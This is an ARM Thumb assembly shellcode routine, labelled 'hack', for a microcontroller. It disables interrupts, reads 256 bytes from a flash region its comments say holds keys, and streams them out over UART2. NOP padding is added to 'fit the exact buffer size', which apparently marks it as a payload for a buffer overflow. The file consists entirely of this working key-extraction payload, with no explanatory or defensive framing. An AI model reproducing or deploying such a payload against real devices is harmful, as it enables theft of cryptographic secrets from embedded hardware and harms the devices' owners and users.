  .section .text
  .global hack
  .syntax unified
  .thumb

hack:
start:
        CPSID I                // disable interrupts
        MOV     R2, #0x441C    // UART2 ISR address 
        MOVT    R2, #0x4000
        MOV     R3, #0x03F0    // Flash address containing keys
        MOVT    R3, #0x0800
        MOV     R4, #256       // Number of bytes to read
send_byte:
        LDRB    R1, [R3], #1   // Read one byte in flash
        STRB    R1, [R2, #12]  // Send byte to UART
wait_complete:
        LDR     R6, [R2, #0]   // Read UART ISR
        ANDS    R6, R6, #64    // Check End of Transmit flag
        CMP     R6, #0         // R6 is 0 if character not transmitted yet
        BEQ.N   wait_complete
        SUB     R4, R4, 1
        CMP     R4, #0
        BNE     send_byte      // R6 different from 0, we can send next byte
        NOP                    // NOP to be added to fit the exact buffer size
        NOP
        NOP
   .end
